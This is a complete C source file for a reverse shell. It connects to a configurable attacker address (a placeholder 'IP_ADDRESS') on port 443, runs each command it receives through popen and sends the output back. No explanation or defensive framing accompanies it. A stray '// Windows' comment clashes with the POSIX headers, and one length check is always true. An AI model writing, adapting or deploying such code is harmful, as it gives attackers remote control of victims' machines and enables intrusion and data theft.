// Windows
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define LHOST "IP_ADDRESS"
#define LPORT 443
#define BUFFERR_SIZE 1024

static int send_all(int sockfd, const void *buf, size_t len) {
    const unsigned char *p = (const unsigned char *)buf;
    size_t total_sent = 0;

    while (total_sent < len) {
        ssize_t sent = send(sockfd, p + total_sent, len - total_sent, 0);
        if (sent < 0) {
            return -1;
        }
        if (sent == 0) {
            return 0;
        }
        total_sent += (size_t)sent;
    }
    return 1;
}

static void trim_in_place(char *s) {
    if (s == NULL) {
        return;
    }

    char *start = s;
    while (*start == ' ' || *start == '\t' || *start == '\n' || *start == '\r' || *start == '\v' || *start == '\f') {
        start++;
    }

    if (start != s) {
        memmove(s, start, strlen(start) + 1);
    }

    size_t len = strlen(s);
    while (len > 0) {
        char c = s[len - 1];
        if (c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '\v' || c == '\f') {
            s[len - 1] = '\0';
            len--;
        } else {
            break;
        }
    }
}

static char *run_command_capture_output(const char *command, size_t *out_len) {
    if (out_len) {
        *out_len = 0;
    }

    size_t cmd_len = strlen(command);
    const char *redir = " 2>&1";
    size_t full_len = cmd_len + strlen(redir) + 1;

    char *full_cmd = (char *)malloc(full_len);
    if (full_cmd == NULL) {
        return NULL;
    }
    memcpy(full_cmd, command, cmd_len);
    memcpy(full_cmd + cmd_len, redir, strlen(redir) + 1);

    FILE *fp = popen(full_cmd, "r");
    free(full_cmd);

    if (fp == NULL) {
        return NULL;
    }

    size_t cap = 4096;
    size_t used = 0;
    char *out = (char *)malloc(cap);
    if (out == NULL) {
        pclose(fp);
        return NULL;
    }

    char buf[4096];
    while (fgets(buf, (int)sizeof(buf), fp) != NULL) {
        size_t n = strlen(buf);
        if (used + n + 1 > cap) {
            size_t new_cap = cap;
            while (used + n + 1 > new_cap) {
                new_cap *= 2;
            }
            char *tmp = (char *)realloc(out, new_cap);
            if (tmp == NULL) {
                free(out);
                pclose(fp);
                return NULL;
            }
            out = tmp;
            cap = new_cap;
        }
        memcpy(out + used, buf, n);
        used += n;
        out[used] = '\0';
    }

    int status = pclose(fp);
    (void)status;

    if (out_len) {
        *out_len = used;
    }
    return out;
}

int main(void) {
    int client = socket(AF_INET, SOCK_STREAM, 0);
    if (client < 0) {
        return 1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LPORT);

    if (inet_pton(AF_INET, LHOST, &addr.sin_addr) != 1) {
        close(client);
        return 1;
    }

    if (connect(client, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(client);
        return 1;
    }

    while (true) {
        char data[BUFFERR_SIZE + 1];
        ssize_t nread = recv(client, data, BUFFERR_SIZE, 0);
        if (nread == 0) {
            break;
        }
        if (nread < 0) {
            char err_msg[512];
            snprintf(err_msg, sizeof(err_msg), "error %s", strerror(errno));
            (void)send_all(client, err_msg, strlen(err_msg));
            continue;
        }

        data[nread] = '\0';

        char command[BUFFERR_SIZE + 1];
        strncpy(command, data, BUFFERR_SIZE);
        command[BUFFERR_SIZE] = '\0';
        trim_in_place(command);

        if (strlen(command) >= 0) {
            size_t out_len = 0;
            char *output = run_command_capture_output(command, &out_len);
            if (output == NULL) {
                char err_msg[512];
                snprintf(err_msg, sizeof(err_msg), "error %s", strerror(errno));
                (void)send_all(client, err_msg, strlen(err_msg));
            } else {
                if (out_len > 0) {
                    (void)send_all(client, output, out_len);
                } else {
                    (void)send_all(client, "", 0);
                }
                free(output);
            }
        }
    }

    close(client);
    return 0;
}
